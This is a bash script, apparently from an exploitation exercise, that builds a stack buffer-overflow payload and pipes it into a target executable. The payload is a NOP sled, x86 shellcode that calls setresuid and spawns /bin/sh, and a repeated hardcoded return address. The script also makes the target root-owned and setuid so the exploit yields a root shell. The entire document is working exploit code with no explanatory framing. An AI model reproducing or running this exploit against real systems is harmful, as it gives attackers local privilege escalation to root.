#!/bin/bash

# Variables
number_of_arguments=$#; echo
target_executable=$1; echo 'Target executable name: '$1
offset_to_eip=$2;     echo '         Offset to EIP: '$2
total_payload_size=$(($offset_to_eip+4))

nopsled='\x90'
nopsled_size=205

root_shellcode="\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
shellcode_size=35

return_addr='\xf4\xd4\xff\xff'; echo '   Address to Nop Sled: '$return_addr
return_addr_size=$(($total_payload_size - $nopsled_size - $shellcode_size))
return_addr_num=$(($return_addr_size/4))
echo $return_addr_num

payload_file='payload.bin'

# Functions
are_arguments_valid() {
    if [[ $number_of_arguments -eq 1 ]] ; then
        echo "*** Run this program with the following arguments ***"
        echo "\$ sudo bash rootshell_exploit.sh executable_name offset_to_eip"
        exit 0
    fi
}
add_perm_change_own() {
    chown root:root $target_executable
    chmod +s $target_executable
}

add_nop_sled() {
    for (( i=1; i<=$nopsled_size; i++ )); do
        echo -ne $nopsled >> $payload_file
    done
    echo '*** 2. 'Added $nopsled_size bytes of NOP Sleds $nopsled
}
add_shellcode() {
    echo -ne $root_shellcode >> $payload_file
    echo '*** 3. 'Root shellcode is added to $payload_file
}
add_return_addr() {
    for (( i=1; i<=$return_addr_num; i++)); do
        echo -ne $return_addr >> $payload_file
    done
    echo '*** 4. '$return_addr_size bytes '('$return_addr_num')' of return address $return_addr is added to $payload_file
}
make_payload() {
    rm $payload_file
    touch $payload_file; echo
    cat $payload_file; echo "*** 1. "Emptied $payload_file content

    # Add Nop Sled
    add_nop_sled
    # Add Shellcode
    add_shellcode
    # Add Return Addresses
    add_return_addr

    echo '***   'Current payload size: $(wc -c $payload_file)
}
exploit() {
    echo; echo EXPLOIT!!
    cat $payload_file - | ./$target_executable
}

# Main
main() {
    # 1. See if arguments are valid
    are_arguments_valid

    # 2. Change permission and add user
    add_perm_change_own

    # 3. Makepayload
    make_payload

    # 4. exploit 
    exploit
}

main